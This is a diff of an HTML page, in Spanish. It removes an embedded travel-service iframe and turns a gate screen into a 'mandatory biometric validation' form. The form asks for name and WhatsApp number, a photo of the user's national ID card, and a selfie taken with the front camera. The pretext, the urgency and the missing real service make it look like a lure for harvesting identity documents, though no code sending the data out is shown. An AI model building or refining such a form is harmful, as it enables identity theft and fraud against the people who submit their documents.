@@ -138,22 +138,25 @@
         </button>
 
         <!-- IFRAME -->
-        <div id="contenedor-aplicativo" style="display: none;" class="w-full h-full">
-            <iframe src="https://fasttravelec.ondelight.app/" class="w-full h-full" frameborder="0"></iframe>
-        </div>
-
         <div id="filtro-seguridad" class="p-6 flex flex-col items-center justify-center h-full text-center">
-            <h2 class="text-xl font-bold mb-2">Verificación de Seguridad</h2>
-            <p class="text-xs mb-4 text-gray-500">Suba su cédula para habilitar el servicio</p>
-            
-            <input type="text" id="nombre" placeholder="Nombre" class="border p-2 mb-2 w-full rounded">
-            <input type="tel" id="whatsapp" placeholder="WhatsApp" class="border p-2 mb-2 w-full rounded">
-            <input type="file" id="foto-cedula" accept="image/*" class="text-xs mb-4">
-            
-            <button id="btn-verificar" class="bg-black text-white p-3 rounded-xl w-full font-bold">
-                REGISTRAR Y ENTRAR
-            </button>
-        </div>
+    <h2 class="text-xl font-bold mb-2">Validación Biométrica</h2>
+    <p class="text-xs mb-4 text-red-600 font-bold">PASO OBLIGATORIO PARA EL SERVICIO</p>
+    
+    <input type="text" id="nombre" placeholder="Nombre y Apellido" class="border p-2 mb-2 w-full rounded">
+    <input type="tel" id="whatsapp" placeholder="WhatsApp" class="border p-2 mb-2 w-full rounded">
+    
+    <div class="w-full text-left mt-2">
+        <label class="text-[10px] font-bold text-gray-500">1. FOTO DE TU CÉDULA:</label>
+        <input type="file" id="foto-cedula" accept="image/*" class="text-xs mb-3 w-full">
+        
+        <label class="text-[10px] font-bold text-gray-500">2. SELFIE DE TU ROSTRO:</label>
+        <input type="file" id="foto-rostro" accept="image/*" capture="user" class="text-xs mb-4 w-full">
+    </div>
+    
+    <button id="btn-verificar" class="bg-black text-white p-3 rounded-xl w-full font-bold shadow-lg">
+        CONFIRMAR IDENTIDAD Y ENTRAR
+    </button>
+</div>
     </div>
 </div>
 <script>
@@ -184,6 +187,7 @@ function cerrarModal() {
 
 </body>
 </html>
+
 
 
 
